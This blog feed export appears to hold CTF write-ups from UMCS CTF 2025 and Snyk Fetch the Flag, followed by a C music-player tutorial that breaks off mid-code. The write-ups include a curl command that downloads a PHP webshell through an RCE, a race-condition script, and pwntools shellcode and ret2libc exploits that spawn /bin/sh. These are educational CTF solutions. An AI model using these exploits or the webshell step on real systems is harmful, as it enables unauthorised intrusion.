[{"content":"Group : $+â‚¬@dÂ¥G@Ng Forensic: Hidden in Plain Graphic First, I open the PCAP file with Wireshark and while scanning through the traffic, I notice a tcp packet which seems to be suspicious because of the large length of it.\nThus, I clicked on it to check and noticed that thereâ€™s magic bytes of PNG file. Then, I tried to extract the hex and convert it into PNG and hereâ€™s the PNG file extracted.\nI tried to decode the PNG file with online tools first to save time and luckily it works.\nOnline tool: https://www.aperisolve.com/12dc4632c2fb6cd620988d3349e9639d\nThe flag found at the Zsteg part:\nSteganography: Broken Since the mp4 is broken, I try to fix it using an online tool first, and it works. After repair with an online tool, the flag is shown in the video.\nOnline tool: https://repair.easeus.com/\nSteganography: Hotline Miami https://github.com/umcybersec/umcs_preliminary/tree/main/stego-Hotline_Miami\nGiven three files from this question, I saw that in readme.txt is given the flag format.\nNext, I found that the wav file must be hidden, so I opened the â€œSonic Visualizerâ€ and added a layer for the spectrogram with all channels mixed. I found that the information or keyword is hidden in the wav file shown on the figure below.\nSo the verb will be â€œWATCHINGâ€ and the year will be â€œ1989â€. Then I go to use an online tool to see the information from the png file. https://www.aperisolve.com/81954be3cdc998e92aeab90a8a228a18\nNotice that the end of the file contains a name called RICHARD.\nLastly, I guess the word for the â€œBeâ€ which I put straight forward is â€œISâ€. I try to submit it then boom successfully get the flag.\nFlag: umcs{RICHARD_IS_WATCHING_1989}\nWeb: Healthcheck https://github.com/umcybersec/umcs_preliminary/tree/main/web-healthcheck\nFirst of all, I reviewed the source code and found that the source code does some good practice in secure coding but it is not secure enough because of using shell_exec() function which is vulnerable to Remote Code Execution (RCE). So I input the curl https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php -o shell.php command to download the shell script given from online. After that, I browse the shell script page and cat the flag content.\nTadaa, the flag shown from the figure above.\nFlag: umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}\nWeb: Straightforward On this challenge I downloaded the zip provided file and checked on app.py code to get the overview of how the logical works.There was a reveal of few endpoints such as POST /register to creates a new user, POST /claim to claims a daily reward, GET /dashboard to shows current balance, POST /buy_flag to attempts to redeem the flag. From inspecting there I came to understand that the website each user can claim a daily bonus and claiming multiple bonus is the bug. So, I created a bash script using curl and xargs to register as a new user, then started to spam /claim points with many requests before the backend checks and prevents duplicate claims. At first I managed to increase the balance with the script but looking back at its logic , I understand that SET balance = balance - 3000 WHERE username =? , it requires to minus 3000 from the existing balance then only it would return with flag.html. So updated the script as below to capture the flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \\#\\!/bin/bash USER=\u0026#34;ctfuser$RANDOM\u0026#34; COOKIE\\_FILE=\u0026#34;cookies.txt\u0026#34; BASE\\_URL=\u0026#34;http://159.69.219.192:7859\u0026#34; echo \u0026#34;\\[\\*\\] Registering user: $USER\u0026#34; curl \\-s \\-c \u0026#34;$COOKIE\\_FILE\u0026#34; \\-X POST \u0026#34;$BASE\\_URL/register\u0026#34; \\\\ \\-d \u0026#34;username=$USER\u0026#34; \\\u0026gt; /dev/null if \\[ $? \\-ne 0 \\]; then echo \u0026#34;Registration failed\u0026#34; exit 1 fi echo \u0026#34;\\[\\*\\] Claiming daily bonus multiple times in parallel...\u0026#34; seq 1 20 | xargs \\-P20 \\-I{} curl \\-s \\-b \u0026#34;$COOKIE\\_FILE\u0026#34; \\-X POST \u0026#34;$BASE\\_URL/claim\u0026#34; \\\u0026gt; /dev/null echo \u0026#34;\\[\\*\\] Waiting for DB writes to finish...\u0026#34; sleep 2 echo \u0026#34;\\[\\*\\] Checking balance...\u0026#34; BALANCE=$(curl \\-s \\-b \u0026#34;$COOKIE\\_FILE\u0026#34; \u0026#34;$BASE\\_URL/dashboard\u0026#34; | grep \\-oP \u0026#39;\\\\d{4,}\u0026#39;) echo \u0026#34;\\[\\*\\] Current balance: $BALANCE\u0026#34; echo \u0026#34;\\[\\*\\] Attempting to redeem flag...\u0026#34; RESPONSE=$(curl \\-s \\-b \u0026#34;$COOKIE\\_FILE\u0026#34; \\-X POST \u0026#34;$BASE\\_URL/buy\\_flag\u0026#34;) \\# Detect UMCS-style flags if echo \u0026#34;$RESPONSE\u0026#34; | grep \\-iq \u0026#34;UMCS\u0026#34;; then echo \u0026#34;Flag found\\!\u0026#34; echo \u0026#34;$RESPONSE\u0026#34; | grep \\-oE \u0026#39;UMCS\\\\{.\\*?\\\\}\u0026#39; else echo \u0026#34;Flag not found. Current balance insufficient.\u0026#34; fi Upon running through the bash script flag was found. So basically, the vulnerability over this challenge lacks concurrency control as multiple requests simultaneously sent to /claim. Each request checks if the user already claimed a bonus but before the server can update the state \u0026ldquo;use\u0026rdquo;, other requests enter in,making receiving more bonus than intended. I came to understand that this is a TOCTOU vulnerability which is a time of check and time of use vulnerability. To prevent this kind of vulnerability,lock the database row or use transactions to avoid simultaneous writes,track requests per session and apply strict rate limiting,implement server-side timestamp checks for bonus claims\nFlag: umcs{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}\nCryptography: Gist of Samuel Hint: https://gist.github.com/umcybersec/55bb6b18159083cf811de96d8fef1583\ngist_of_samuel.txt :\n1 ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‚ğŸš‹ğŸš‹ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‹ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‹ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‹ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‹ğŸš‹ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‚ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‚ğŸš†ğŸš‹ğŸš‹ğŸš‚ğŸš‚ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‹ğŸš‚ğŸš†ğŸš‹ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‹ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‹ğŸš†ğŸš‹ğŸš‹ğŸš†ğŸš‹ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš†ğŸš‚ğŸš‹ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš‚ğŸš†ğŸš‹ğŸš‹ğŸš‹ğŸš‚ğŸš‚ Based on this sequence, I assume it is morse code where\nğŸš‚ represents \u0026rsquo; . \u0026rsquo;\nğŸš‹ represents \u0026rsquo; - \u0026rsquo;\nğŸš† represents \u0026rsquo; space '\nSo when decode it, the output is:\nHERE.......IS.......YOUR.......PRIZE.......E012D0A1FFFAC42D6AAE00C54078AD3E.......SAMUEL.......REALLY.......LIKES.......TRAIN,.......AND.......HIS.......FAVORITE.......NUMBER.......IS.......8\nAfter consulting ChatGPT, getting know that E012D0A1FFFAC42D6AAE00C54078AD3E is a hash number, meanwhile combining with the hint given, the URL link is then replaced with this hash number.\nAgain, we get these unreadable blocks. At first, I thought it would be ciphertext that needed to be decrypted to get the plaintext by using Lingojam but it shows more unreadable characters as shown below.\nWell, it was too overthinking, letâ€™s go back to the clues given: SAMUEL.......REALLY.......LIKES.......TRAIN,.......AND.......HIS.......FAVORITE.......NUMBER.......IS.......8. After searching, the only decryption method named Rail Fence (Zig-Zag) Cipher is related to trains. Therefore, after decrypting it by using key=8, we will get the rearranged blocks. Download the decrypted blocks in the notepad and adjust the widget until it shows the text below: WILLOWTREECAMPSITE.\nFlag: umcs{willow_tree_campsite}\nPWN: Babysc https://github.com/umcybersec/umcs_preliminary/tree/main/pwn-babysc\nFrom the source code given, the vuln() function shows that it reads 4096 bytes from the input and checks the bad code received which are 0x80cd (int 0x80), 0x340f (sysenter), and 0x050f (syscall) to prevent syscall and executes from the input. So I am using the pwntools library given from the online to make it easily implement my binary exploitation. Lastly, the python script is on the below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 from pwn import * exe = \u0026#39;./babysc\u0026#39; elf = context.binary = ELF(exe, checksec=True) #context.log_level = \u0026#39;DEBUG\u0026#39; context.arch=\u0026#39;amd64\u0026#39; sh = remote(\u0026#39;34.133.69.112\u0026#39;, 10001) #sh = process(exe) forbidden_pairs = [b\u0026#39;\\x0f\\x05\u0026#39;, b\u0026#39;\\x0f\\x34\u0026#39;, b\u0026#39;\\xcd\\x80\u0026#39;] shellcode = \u0026#39;\u0026#39;\u0026#39; /* Get address of placeholder using GAS RIP-relative syntax */ lea rbx, [rip + placeholder] /* Write forbidden syscall bytes DYNAMICALLY (0x0f 0x05) */ mov byte ptr [rbx], 0x0f mov byte ptr [rbx + 1], 0x05 /* Set up execve(\u0026#34;/bin/sh\u0026#34;, 0, 0) */ xor rsi, rsi push rsi mov rdi, 0x68732f2f6e69622f /* /bin//sh */ push rdi mov rdi, rsp xor rdx, rdx mov eax, 0x3b /* execve syscall number */ jmp rbx /* Jump to modified code */ placeholder: .byte 0x90, 0x90 /* Placeholder for syscall */ \u0026#39;\u0026#39;\u0026#39; sc = asm(shellcode) for i in range(len(sc) - 1): pair = shellcode[i:i+2] if pair in forbidden_pairs: print(f\u0026#39;BAD BYTE --\u0026gt; 0x{byte:02x}\u0026#39;) print(f\u0026#39;ASCII --\u0026gt; {chr(byte)}\u0026#39;) sh.recvline() sh.sendline(sc.ljust(0x1000, b\u0026#39;\\x90\u0026#39;)) sh.interactive() The shellcode given to the binary will:\nCalculate the address of the placeholder at runtime Write the forbidden syscall bytes dynamically Execute /bin/sh using the execve syscall After that, I execute the python script I successfully enter to the instance given then I use cat /flag (based on the Dockerfile given) to get the flag content. Boom flag found.\nFlag: umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}\nPWN: Liveleak From this question, I found the given â€œlibcâ€ library and â€œldâ€ library so I found the online tool called â€œpwninitâ€ to patch the given binary to make the binary run using the given â€œlibcâ€ library. Then, I try to decompile the binary to understand the source code.\nContent of main function\nContent of vuln function\nNotice that, inside vuln() function it contains the vulnerability for buffer overflow attack because of using fgets() function but the size does not fit into the declared variable. So write the python script for the exploitation.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 from pwn import * exe = ELF(\u0026#34;./chall_patched\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) rop = ROP(exe) context.binary = exe pop_rdi = rop.find_gadget([\u0026#34;pop rdi\u0026#34;])[0] ret = rop.find_gadget([\u0026#34;ret\u0026#34;])[0] puts_got = exe.got.puts puts_plt = exe.plt.puts vuln = exe.symbols.vuln def conn(): if args.LOCAL: return gdb.debug([exe.path]) else: return remote(\u0026#34;34.133.69.112\u0026#34;, 10007) def main(): r = conn() # Leak puts@got.plt` r.recvuntil(b\u0026#34;Enter your input: \\n\u0026#34;) payload = flat( b\u0026#39;A\u0026#39; * 72, # Overflow buffer (64) + RBP (8) pop_rdi, # (1st argument for `puts`) puts_got, # Address of `puts` in GOT (to leak) puts_plt, # Call `puts` to print the leaked address vuln, # Return to vuln() for second payload p64(ret) * 3 # Align stack for vuln() return )[:127] # Trim to 127 bytes (exclude NULL) r.send(payload) # Parse leaked address leaked_puts = u64(r.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) libc.address = leaked_puts - libc.symbols.puts success(f\u0026#34;Libc base: {hex(libc.address)}\u0026#34;) # Send shell payload` r.recvuntil(b\u0026#34;Enter your input: \\n\u0026#34;) bin_sh = next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) system = libc.symbols.system payload = flat( b\u0026#39;A\u0026#39; * 72, ret, # Align stack to 16 bytes (ABI requirement)` pop_rdi, # (1st argument for `system`) bin_sh, # Address of \u0026#34;/bin/sh\u0026#34; string in libc` system, # Call `system` `` p64(0xdeadbeef) # Optional exit (not critical)` )[:127] # Trim to 127 bytes` r.send(payload) r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() The Script will:\nLeak Libc Address by using puts to print out the address of puts function and calculate it to find the libc base address Execute system(\u0026quot;/bin/sh\u0026quot;) using leaked libc\u0026rsquo;s address. After that, I execute the python script I successfully enter to the instance given then I use cat /flag (based on the Dockerfile given) to get the flag content. Boom flag found.\nFlag: umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}\nReverse Engineering: htpp-server First I check if the given file belongs to which type using the file command. Notice that this is a ELF 64-bit executable file so I opened up with Ghidra to decompile it to view the source code.\nEntry Function for the program\nContent of FUN_001013a9\nContent of FUN_0010154b\nThe pictures above show that the program is started with the c runtime library and calling the main function which is FUN_001013a9. Then, I roughly viewed the code and found that the program listens to an 8080 port with a specific address and creates a subprocess to run the function named FUN_0010154b. After that, I found that the strstr() function is used to find the string input that contains â€œGET /goodshit/umcs_server HTTP/13.37â€. Then I connect to the machine using the nc command and input the string given. Boom the flag will be shown.\numcs{http_server_a058712ff1da79c9bbf211907c65a5cd}\nWeb: Microservices ï¼ˆSOLVE AFTER PRELIMINARY ROUND ENDï¼‰ Content of flag-api Dockerfile\nContent of flag-api nginx.conf\nAfter viewing the files from the folder flag-api I found that the flag-api instance is exposing the port 5555 to public and another nginx configuration was written to allow Cloudflare IPs to access it. So I opened up my cloudflare account and created a worker with a â€œHello worldâ€ template. Then I edit the code from IDE and preview it. Boom, the flag has been found.\nSource code for worker.js\nFlag: UMCS{w0w_1m_cur1ous_on_h0w_y0u_g0t_h3r3}\n","date":"2025-04-14T00:00:00+08:00","image":"https://xph0816.github.io/p/umcsctf-writeup/feature-umcs-ctf-2025_hu29242262a73c9ee95f0d5de12fe6bdef_702289_120x120_fill_box_smart1_3.png","permalink":"https://xph0816.github.io/p/umcsctf-writeup/","title":"UMCTF-Writeup"},{"content":"Snapshot Writeup I Start by downloading the binary and decompiling using online decompiler Binary Ninja. The Binary is a 64-bit ELF file. The decompiled code shows that the binary has a function called echo which takes a string as input and prints it to the console. The binary also has a function called main which calls the echo function with a hardcoded string.\nNotice that the main function calls the gets function which can be exploited to perform a buffer overflow attack. The gets function does not check the length of the input string, which means that we can overflow the buffer and overwrite the return address of the main function. This allows us to execute arbitrary code.\nI will use the gdb debugger to analyze the binary and find the address of the winfunction.\nthen I use the python command to create a pattern of 137 bytes and then run the binary with that input to test the buffer overflow.\nthen I run the binary in gdb and check the stack to see if the return address has been overwritten.\nNotice that the rbp (x64 stack pointer) points has been overwritten with the address. So I try input another character to see if the return address which on rip (x64 stack pointer) has been overwritten.\nI found that the return address has been written to 0x4242424242. So I use python to create a payload that will overwrite the return address with the address of the win function which is 0x0000000000401216.\n1 python -c \u0026#39;print \u0026#34;A\u0026#34;*136 + \u0026#34;\\x16\\x12\\x40\\x00\\x00\\x00\u0026#34;\u0026#39; \u0026gt; payload.txt Before running the binary, I make a fake flag.txt file to check if the binary is running the win function. The win function is supposed to read the flag from the flag.txt file and print it to the console.\n1 echo \u0026#34;FTF{this_is_a_fake_flag}\u0026#34; \u0026gt; flag.txt Then I run the binary with the payload and check the output.\n1 ./echo \u0026lt; payload.txt Ta-da! I got the flag. The flag is FTF{this_is_a_fake_flag}. The binary is vulnerable to buffer overflow attacks and can be exploited to execute arbitrary code. The gets function is the main vulnerability in this binary. It is important to always check the length of the input string when using functions like gets to prevent buffer overflow attacks.\nNext, we create a script to exploit the binary on the server. The script will create a payload that will overwrite the return address with the address of the win function and then run the binary with the payload.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import socket def exploit(host, port, payload): \u0026#34;\u0026#34;\u0026#34;Sends the payload and receives the echoed text.\u0026#34;\u0026#34;\u0026#34; try: with socket.create_connection((host, port)) as s: # Receive the initial prompt prompt = s.recv(1024).decode(\u0026#39;latin-1\u0026#39;, errors=\u0026#39;ignore\u0026#39;) # Or utf-8 print(f\u0026#34;Received prompt: {prompt}\u0026#34;) # Send the payload s.sendall(payload) s.sendall(b\u0026#34;\\n\u0026#34;) # Send a newline character, very important. # Receive the echoed text (and any other responses) response = s.recv(4096).decode(\u0026#39;latin-1\u0026#39;, errors=\u0026#39;ignore\u0026#39;) # Or utf-8 print(f\u0026#34;Received response: {response}\u0026#34;) except ConnectionRefusedError: print(f\u0026#34;Connection refused to {host}:{port}\u0026#34;) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: host = \u0026#34;challenge.ctf.games\u0026#34; # Replace with the actual host port = 31084 # Replace with the actual port number payload = b\u0026#34;A\u0026#34; * 126 + b\u0026#34;\\x16\\x12\\x40\\x00\\x00\\x00\u0026#34; # Your payload exploit(host, port, payload) and the flag will be printed on the console. flag{4f4293237e37d06d733772a087299f17}\nExplanation Why It Works The exploit works because the gets function does not check the length of the input string, which allows us to overflow the buffer and overwrite the return address of the main function. On the other hand, the compiler does not add any stack canaries or other protections to prevent buffer overflow attacks. This allows us to execute arbitrary code by overwriting the return address with the address of the win function.\nBuffer Overflow First of all, let\u0026rsquo;s understand what a buffer overflow is. A buffer overflow occurs when a program writes more data to a buffer than it can hold. This can lead to overwriting adjacent memory locations, including the return address of a function. When the function returns, it will jump to the overwritten address, which can lead to arbitrary code execution.\nIn x86_64 architecture, the stack grows downwards, meaning that the higher memory addresses are at the top of the stack and the lower memory addresses are at the bottom. When a function is called, a new stack frame is created, and the return address is pushed onto the stack. If we overflow the buffer, we can overwrite the return address with our own address. In diagram below, we can see how the stack looks like before and after the overflow but is x86 architecture.\nX86_64 architecture is similar to x86 architecture but with some differences. In x86_64 architecture, the stack grows downwards, and the return address is stored in the RIP register. When the function returns, it jumps to the address stored in the RIP register. If we overflow the buffer and overwrite the return address with our own address, we can execute arbitrary code.\nReferences The Stack ","date":"2025-03-30T00:00:00+08:00","image":"https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/featured-image-FTF-25_hu1ae0a39953be00c3e82b0aa3ddef0f40_1280507_120x120_fill_box_smart1_3.png","permalink":"https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/","title":"Echo"},{"content":"Introduction In this blog post, we will explore the development of a Command Line Interface (CLI) Music Player using the C programming language. This project will help you understand various data structures and algorithms, particularly focusing on the implementation of a double linked list and the architecture of a music player which can be used to play music files.\nWhy a CLI Music Player? Creating a CLI Music Player is an excellent way to practice and enhance programming skills in C. It involves managing data structures, and implementing algorithms to manipulate and play music files. Additionally, it provides a practical application of theoretical concepts.\nSetting Up the Project To get started, ensure I have a C compiler installed on my system. I can use GCC compiler, which is available on most platforms. Create a new directory for your project and initialize it with the necessary files.\nLinux 1 2 3 sudo apt install gcc mkdir music-player cd music-player Windows (MinGW) 1 2 3 scoop install w64devkit # Install MinGW using Scoop sometime not latest version mkdir music-player cd music-player or download from GitHub and Set the PATH Environment Variable.\nWays to Set PATH How to set PATH Tutorial Add \u0026lt;path-to-w64devkit\u0026gt;\\w64devkit\\bin to PATH. Implementation of the Music Player Software Architecture The music player will be implemented in two parts: the frontend and the backend. The frontend will handle the user interface and interaction, while the backend will manage the music files and playback.\nFrontend Implementation Basic UI Implementation Main Menu Implementation Main menu is the first screen that the user will see when they start the music player. It will display the available options and allow the user to navigate through the application.\n1 2 3 4 5 6 7 8 9 10 11 12 13 int MainMenu() { printf(\u0026#34;Welcome to Music Player 1.0\\n\u0026#34;); printf(\u0026#34;1. Select song from the Song List\\n\u0026#34;); printf(\u0026#34;2. Play the selected song\\n\u0026#34;); printf(\u0026#34;3. Next song\\n\u0026#34;); printf(\u0026#34;4. Previous song\\n\u0026#34;); printf(\u0026#34;5. Display the current Playlist\\n\u0026#34;); printf(\u0026#34;6. Delete the current song\\n\u0026#34;); printf(\u0026#34;7. Delete Song from the PlayList\\n\u0026#34;); printf(\u0026#34;8. Exit\\n\u0026#34;); return getValidInt(1, 8, \u0026#34;Enter your choice: \u0026#34;); } Main menu will display the available options and prompt the user to enter a choice. The getValidInt function is used to validate the user input and ensure that it is within the specified range.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int getValidInt(int min, int max, char *message) { int input; do { printf(\u0026#34;%s\u0026#34;, message); scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); if (input \u0026lt; min || input \u0026gt; max) { printf(\u0026#34;Invalid input. Please enter a number between %d and %d.\\n\u0026#34;, min, max); } } while (input \u0026lt; min || input \u0026gt; max); return input; } The getValidInt function will keep prompting the user to enter a number until a valid input is provided. Next, we will put it all together in the main function.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 int main() { List *list = newList(); Cursor *cursor = newCursor(); for(;;){ switch (MainMenu()) { case 1: // Add song to the playlist break; case 2: // Play the selected song break; case 3: // Play the next song break; case 4: // Play the previous song break; case 5: // Display the current playlist break; case 6: // Delete the current song break; case 7: // Delete song from the playlist break; case 8: // Exit the application exit(0); break; } printf(\u0026#34;Press any key to continue . . .\u0026#34;); getch(); // #include \u0026lt;conio.h\u0026gt; }; return 0; } The main function will display the main menu and prompt the user to enter a choice. Based on the user\u0026rsquo;s input, it will call the corresponding function to perform the desired action. The do-while loop will keep the application running until the user chooses to exit.\nPlaylist Implementation (Doubly Linked List) A double linked list is a data structure that allows traversal in both directions. It is ideal for managing the playlist in our music player. Below is a simple implementation of a double linked list in C.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; typedef struct { string name; } Song; struct node { struct node *prev; Song data; struct node *next; }; typedef struct node Node; typedef struct PLAYLIST { Node *head; Node *tail; int size; } List; Node *newNode() { Node *node = (Node *)malloc(sizeof(Node)); node-\u0026gt;prev = NULL; node-\u0026gt;next = NULL; return node; } List *newList() { List *list = (List *)malloc(sizeof(List)); list-\u0026gt;head = NULL; list-\u0026gt;tail = NULL; list-\u0026gt;size = 0; return list; } void addSong(List *list, Node *node) { if (list-\u0026gt;head == NULL) { list-\u0026gt;head = node; list-\u0026gt;tail = node; } else { list-\u0026gt;tail-\u0026gt;next = node; node-\u0026gt;prev = list-\u0026gt;tail; list-\u0026gt;tail = node; } list-\u0026gt;size++; } void printPlayList(List list, Cursor cursor) { Node *node = list.head; printf(\u0026#34;+---------+---------------------------------------------------------------+\\n\u0026#34;); printf(\u0026#34;| Index | Title |\\n\u0026#34;); printf(\u0026#34;+---------+---------------------------------------------------------------+\\n\u0026#34;); int index = 1; char buffer[MAX_INDEX]; while (node != NULL) { snprintf(buffer, MAX_INDEX, \u0026#34;%d\u0026#34;, index); printf(\u0026#34;| %7s | %61s |\\n\u0026#34;, index == cursor.index ? \u0026#34; * \u0026#34; : buffer, node-\u0026gt;data.name); node = node-\u0026gt;next; index++; } printf(\u0026#34;+---------+---------------------------------------------------------------+\\n\u0026#34;); } Cursor Implementation Cursor Definition The cursor feature allows the user to navigate through the playlist and select a song to play. It keeps track of the current position in the playlist and provides methods to move to the next or previous song. The cursor structure is defined as follows:\n1 2 3 4 5 typedef struct CURSOR { Node *node; int index; } Cursor; Next and Previous Song Before we implement the next and prev functions, we need to define a helper function to check if the cursor is currently pointing to a song in the playlist.\n1 2 3 4 5 6 7 8 9 int isSelected(Cursor *cursor) { if (cursor-\u0026gt;node == NULL) { printf(\u0026#34;No song selected.\\n\u0026#34;); return 0; } return 1; } The next and prev functions will move the cursor to the next and previous songs in the playlist, respectively. Because the doubly linked list allows traversal in both directions, we can easily implement these functions.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 void next(Cursor *cursor) { // Check if the cursor is at the end of the playlist if (!isSelected(cursor)) return; // Move the cursor to the next song if (cursor-\u0026gt;node-\u0026gt;next == NULL) { printf(\u0026#34;This is the last 